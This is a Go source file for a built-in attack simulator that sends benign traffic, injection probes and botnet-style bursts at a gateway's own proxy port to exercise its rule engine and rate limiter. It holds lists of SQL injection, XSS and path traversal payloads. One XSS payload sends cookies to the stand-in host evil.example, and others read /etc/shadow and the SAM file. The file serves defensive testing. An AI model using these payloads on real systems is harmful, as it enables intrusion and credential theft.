package main

import (
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// Simulator is the built-in attack daemon. It generates distributed botnet spikes
// and injection payloads against the gateway's own proxy port so the rule engine,
// rate limiter and anomaly scorer are exercised continuously.
type Simulator struct {
	target string
	client *http.Client
	rng    *rand.Rand
}

func NewSimulator(target string) *Simulator {
	return &Simulator{
		target: target,
		client: &http.Client{Timeout: 3 * time.Second},
		rng:    rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

var benignPaths = []string{
	"/api/products", "/api/users/profile", "/api/orders", "/api/search?q=laptop",
	"/api/cart", "/api/health", "/api/metrics", "/api/feed", "/api/notifications",
	"/static/app.js", "/static/style.css", "/api/settings", "/api/reviews",
}

var sqliPayloads = []string{
	"/api/login?user=admin' OR 1=1--&pass=x",
	"/api/products?id=42 UNION SELECT username,password FROM users",
	"/api/search?q='; DROP TABLE users;--",
	"/api/orders?id=1 AND SLEEP(5)",
	"/api/users?id=7 UNION ALL SELECT credit_card FROM payments",
	"/api/login?user=admin'--&pass=anything",
	"/api/items?cat=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
	"/api/search?q=1' UNION SELECT table_name FROM information_schema.tables--",
}

var xssPayloads = []string{
	"/api/comments?body=<script>alert(document.cookie)</script>",
	"/api/profile?name=<img src=x onerror=fetch('https://evil.example/?c='+document.cookie)>",
	"/api/search?q=<svg onload=eval(atob('YWxlcnQoMSk='))>",
	"/api/feedback?msg=<iframe srcdoc='<script>steal()</script>'>",
	"/api/bio?text=javascript:alert(1)//",
	"/api/posts?title=<body onload=alert('pwned')>",
}

var traversalPayloads = []string{
	"/static/../../../../etc/passwd",
	"/api/download?file=..%2f..%2f..%2fetc%2fshadow",
	"/files/..%252f..%252f..%252fwin.ini",
	"/api/export?path=....//....//etc/passwd",
	"/assets/../../../c:\\windows\\system32\\config\\sam",
	"/api/read?doc=/proc/self/environ",
}

// randomBotIP fabricates a plausible public IPv4 address.
func (s *Simulator) randomBotIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		s.rng.Intn(223)+1, s.rng.Intn(256), s.rng.Intn(256), s.rng.Intn(254)+1)
}

// fire sends one simulated request through the gateway.
func (s *Simulator) fire(method, path, ip string, burst bool) {
	req, err := http.NewRequest(method, s.target+path, nil)
	if err != nil {
		return
	}
	req.Header.Set("X-Forwarded-For", ip)
	req.Header.Set("User-Agent", s.randomUA())
	if burst {
		req.Header.Set("X-Ghost-Burst", "1")
	}
	resp, err := s.client.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()
}

func (s *Simulator) randomUA() string {
	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
		"python-requests/2.32.0",
		"curl/8.9.0",
		"Go-http-client/1.1",
		"sqlmap/1.8.7",
		"Nikto/2.5.0",
	}
	return uas[s.rng.Intn(len(uas))]
}

// Run starts the daemon loop. It never returns; launch it as a goroutine.
func (s *Simulator) Run() {
	for {
		// Baseline: steady benign traffic from a small pool of "real" clients.
		for i := 0; i < 2+s.rng.Intn(3); i++ {
			ip := fmt.Sprintf("10.0.%d.%d", s.rng.Intn(4), 10+s.rng.Intn(40))
			s.fire("GET", benignPaths[s.rng.Intn(len(benignPaths))], ip, false)
			time.Sleep(time.Duration(40+s.rng.Intn(160)) * time.Millisecond)
		}

		// Scattered probes: single injection attempts from random bot IPs.
		if s.rng.Float64() < 0.55 {
			kind := s.rng.Intn(3)
			switch kind {
			case 0:
				s.fire("GET", sqliPayloads[s.rng.Intn(len(sqliPayloads))], s.randomBotIP(), false)
			case 1:
				s.fire("GET", xssPayloads[s.rng.Intn(len(xssPayloads))], s.randomBotIP(), false)
			default:
				s.fire("GET", traversalPayloads[s.rng.Intn(len(traversalPayloads))], s.randomBotIP(), false)
			}
		}

		// Botnet spike: every ~8-20s a swarm hammers one route to trip the limiter.
		if s.rng.Float64() < 0.12 {
			botnet := make([]string, 6+s.rng.Intn(10))
			for i := range botnet {
				botnet[i] = s.randomBotIP()
			}
			target := benignPaths[s.rng.Intn(len(benignPaths))]
			for wave := 0; wave < 25+s.rng.Intn(35); wave++ {
				ip := botnet[s.rng.Intn(len(botnet))]
				s.fire("GET", target, ip, true)
				if s.rng.Float64() < 0.2 {
					s.fire("GET", sqliPayloads[s.rng.Intn(len(sqliPayloads))], ip, true)
				}
			}
		}

		time.Sleep(time.Duration(300+s.rng.Intn(900)) * time.Millisecond)
	}
}

// EncodePayload is a helper for tests/tools that need URL-encoded payloads.
func EncodePayload(s string) string {
	return url.QueryEscape(s)
}

// pickWeighted is reserved for future payload weighting; keeps imports tidy.
var _ = strings.ToLower
